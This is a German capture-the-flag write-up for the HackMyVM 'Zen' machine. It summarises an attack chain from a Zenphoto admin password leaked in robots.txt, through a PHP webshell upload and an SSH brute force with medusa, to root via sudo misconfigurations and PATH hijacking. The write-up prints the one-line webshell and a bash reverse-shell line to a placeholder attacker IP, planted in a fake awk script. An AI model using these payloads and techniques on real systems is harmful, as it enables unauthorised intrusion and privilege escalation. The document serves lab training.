# Zen - HackMyVM (Hard)
 
![Zen.png](Zen.png)

## Übersicht

*   **VM:** Zen
*   **Plattform:** HackMyVM (https://hackmyvm.eu/machines/machine.php?vm=Zen)
*   **Schwierigkeit:** Hard
*   **Autor der VM:** DarkSpirit
*   **Datum des Writeups:** 12. März 2020
*   **Original-Writeup:** https://alientec1908.github.io/Zen_HackMyVM_Hard/
*   **Autor:** Ben C.

## Kurzbeschreibung

Das Ziel der "Zen"-Challenge war die Erlangung von User- und Root-Rechten. Der Weg begann mit der Enumeration eines Webservers (Port 80), der eine Zenphoto 1.5.7 Installation hostete. In der `/robots.txt` wurde das Passwort `P@ssw0rd` für den Admin-Account gefunden. Nach dem Login in das Zenphoto-Admin-Interface (`/zp-core/admin.php`) wurde eine bekannte Shell-Upload-Schwachstelle (CVE für Version 1.5.7, z.B. von Packet Storm oder GitHub) ausgenutzt, um eine PHP-Webshell (`bentec.php`) in das `/themes/`-Verzeichnis hochzuladen. Dies ermöglichte RCE und das Etablieren einer Reverse Shell als `www-data`. Als `www-data` wurden die Benutzer `kodo`, `zenmaster` und `hua` aus `/etc/passwd` identifiziert. Mit `medusa` wurde das SSH-Passwort für `zenmaster` (`zenmaster`) gebruteforced. Als `zenmaster` zeigte `sudo -l`, dass `/bin/bash` als Benutzer `kodo` ausgeführt werden durfte, was einen Wechsel zu `kodo` ermöglichte. Als `kodo` zeigte `sudo -l`, dass `/usr/bin/see` (ein Symlink zu `run-mailcap`) als Benutzer `hua` ausgeführt werden durfte. Dies wurde vermutlich durch Manipulation der `PAGER`-Umgebungsvariable ausgenutzt, um eine Shell als `hua` zu erhalten (genauer Exploit nicht im Log). Schließlich erlaubte eine `sudo`-Regel dem Benutzer `hua`, `/usr/sbin/add-shell` als `root` auszuführen. Da `add-shell` intern `awk` ohne absoluten Pfad aufrief, konnte durch PATH-Hijacking (Erstellen einer bösartigen `awk`-Datei in `/usr/local/bin`, die eine Reverse Shell startete) eine Root-Shell erlangt werden.

## Disclaimer / Wichtiger Hinweis

Die in diesem Writeup beschriebenen Techniken und Werkzeuge dienen ausschließlich zu Bildungszwecken im Rahmen von legalen Capture-The-Flag (CTF)-Wettbewerben und Penetrationstests auf Systemen, für die eine ausdrückliche Genehmigung vorliegt. Die Anwendung dieser Methoden auf Systeme ohne Erlaubnis ist illegal. Der Autor übernimmt keine Verantwortung für missbräuchliche Verwendung der hier geteilten Informationen. Handeln Sie stets ethisch und verantwortungsbewusst.

## Verwendete Tools

*   `arp-scan`
*   `nmap`
*   `gobuster`
*   `vi`
*   Web Browser (impliziert)
*   `grep`
*   `medusa`
*   `ssh`
*   `python3` (für Shell-Stabilisierung)
*   `find`
*   `cat`
*   `sudo`
*   `ls`
*   `nano` (erwähnt)
*   `chmod`
*   `nc` (netcat)
*   `/usr/bin/see` (run-mailcap)
*   `/usr/sbin/add-shell`
*   Standard Linux-Befehle (`cd`, `id`, `pwd`, `export`, `echo`)

## Lösungsweg (Zusammenfassung)

Der Angriff auf die Maschine "Zen" gliederte sich in folgende Phasen:

1.  **Reconnaissance & Web Enumeration (Zenphoto):**
    *   IP-Findung mit `arp-scan` (Ziel-IP `192.168.2.133` oder `.137` je nach Log-Abschnitt, `zen.hmv` in `/etc/hosts`).
    *   `nmap`-Scan identifizierte offene Ports: 22 (SSH - OpenSSH 7.9p1) und 80 (HTTP - Nginx 1.14.2).
    *   Manuelle Untersuchung und `gobuster` auf Port 80. Analyse von `/robots.txt` enthüllte `Disallow: /P@ssw0rd` (Admin-Passwort) und Hinweise auf Zenphoto 1.5.7.
    *   Identifizierung des Zenphoto-Admin-Logins (`/zp-core/admin.php`).

2.  **Initial Access (Zenphoto RCE zu `www-data`):**
    *   Login in das Zenphoto-Admin-Interface mit `admin:P@ssw0rd`.
    *   Ausnutzung einer bekannten Shell-Upload-Schwachstelle in Zenphoto 1.5.7 (z.B. via GitHub Exploit).
    *   Hochladen einer PHP-Webshell (`bentec.php` mit `<?php system($GET['cmd']); ?>`) in das `/themes/`-Verzeichnis.
    *   Ausführung eines Bash-Reverse-Shell-Payloads über die Webshell (`http://192.168.2.133/themes/bentec.php?cmd=...reverse_shell...`).
    *   Erlangung einer interaktiven Shell als `www-data` nach Stabilisierung.

3.  **Privilege Escalation (von `www-data` zu `zenmaster`):**
    *   Als `www-data` wurden die Benutzer `kodo`, `zenmaster`, `hua` aus `/etc/passwd` enumeriert.
    *   `medusa -h 192.168.2.133 -M ssh -U [userliste] -P /usr/share/wordlists/rockyou.txt` fand das Passwort `zenmaster` für den Benutzer `zenmaster`.
    *   SSH-Login als `zenmaster:zenmaster`.
    *   User-Flag `hmvzenit` in `/home/zenmaster/user.txt` gelesen.

4.  **Privilege Escalation (von `zenmaster` zu `kodo` via `sudo bash`):**
    *   `sudo -l` als `zenmaster` zeigte: `(kodo) NOPASSWD: /bin/bash`.
    *   Ausführung von `sudo -u kodo /bin/bash`.
    *   Erlangung einer Shell als `kodo`.

5.  **Privilege Escalation (von `kodo` zu `hua` via `sudo run-mailcap`):**
    *   `sudo -l` als `kodo` zeigte: `(hua) NPASSWD: /usr/bin/see` (Symlink zu `run-mailcap`).
    *   *Der genaue Exploit für `run-mailcap` ist im Log nicht dokumentiert, aber GTFOBins beschreibt Methoden via `PAGER`-Manipulation.*
    *   Erlangung einer Shell als `hua` (impliziert).

6.  **Privilege Escalation (von `hua` zu `root` via `sudo add-shell` und PATH Hijacking):**
    *   `sudo -l` als `hua` zeigte: `(root) NOPASSWD: /usr/sbin/add-shell`.
    *   Analyse von `/usr/sbin/add-shell` (impliziert) zeigte, dass es intern `awk` ohne absoluten Pfad aufrief.
    *   PATH-Hijacking:
        1.  `cd /usr/local/bin` (oder anderes Verzeichnis im `secure_path` vor `/usr/bin`)
        2.  `echo '#!/bin/bash' > awk`
        3.  `echo 'bash -c "bash -i >& /dev/tcp/[Angreifer-IP]/85 0>&1"' >> awk` (oder direkter `/bin/bash`)
        4.  `chmod +x awk`
    *   Starten eines `nc`-Listeners auf dem Angreifer-System (Port 85).
    *   Ausführung von `sudo /usr/sbin/add-shell [beliebiges_argument]` als `hua`.
    *   Das `sudo`-Kommando führte das manipulierte `awk`-Skript mit Root-Rechten aus.
    *   Erlangung einer Root-Shell.
    *   Root-Flag `hmvenlightenment` in `/root/root.txt` gelesen.

## Wichtige Schwachstellen und Konzepte

*   **Passwort in `robots.txt`:** Admin-Passwort für Zenphoto wurde preisgegeben.
*   **Veraltete Software mit bekannter RCE (Zenphoto 1.5.7):** Ausnutzung einer Shell-Upload-Schwachstelle.
*   **Schwaches Passwort (brute-forceable):** SSH-Passwort für `zenmaster` (`zenmaster`) war leicht zu erraten/bruteforcen.
*   **Unsichere `sudo`-Konfigurationen:**
    *   `zenmaster` durfte `/bin/bash` als `kodo` ausführen.
    *   `kodo` durfte `/usr/bin/see` (run-mailcap) als `hua` ausführen (Shell-Escape möglich).
    *   `hua` durfte `/usr/sbin/add-shell` als `root` ausführen, welches anfällig für PATH-Hijacking war.
*   **PATH Hijacking:** Ein SUID-Programm oder ein via `sudo` ausgeführtes Programm rief einen Befehl (`awk`) ohne absoluten Pfad auf, was die Ausführung eines bösartigen Skripts ermöglichte.

## Flags

*   **User Flag (`/home/zenmaster/user.txt`):** `hmvzenit`
*   **Root Flag (`/root/root.txt`):** `hmvenlightenment`

## Tags

`HackMyVM`, `Zen`, `Hard`, `robots.txt`, `Zenphoto`, `RCE`, `Shell Upload`, `Password Cracking`, `Medusa`, `SSH`, `sudo Exploitation`, `run-mailcap`, `PATH Hijacking`, `Privilege Escalation`, `Linux`, `Web`
